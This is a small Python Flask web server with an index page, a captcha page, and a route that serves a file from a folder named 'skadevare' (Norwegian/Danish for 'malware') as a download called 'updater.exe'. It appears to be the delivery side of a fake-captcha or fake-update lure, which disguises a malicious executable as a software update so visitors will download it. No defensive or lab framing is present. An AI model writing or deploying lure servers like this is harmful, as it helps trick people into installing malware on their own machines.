from flask import Flask, render_template, send_file

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/captcha")
def captcha():
    return render_template("captcha.html")

@app.route("/download/updater")
def download_updater():
    return send_file("skadevare/updater.exe", as_attachment=True, download_name="updater.exe")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=False)
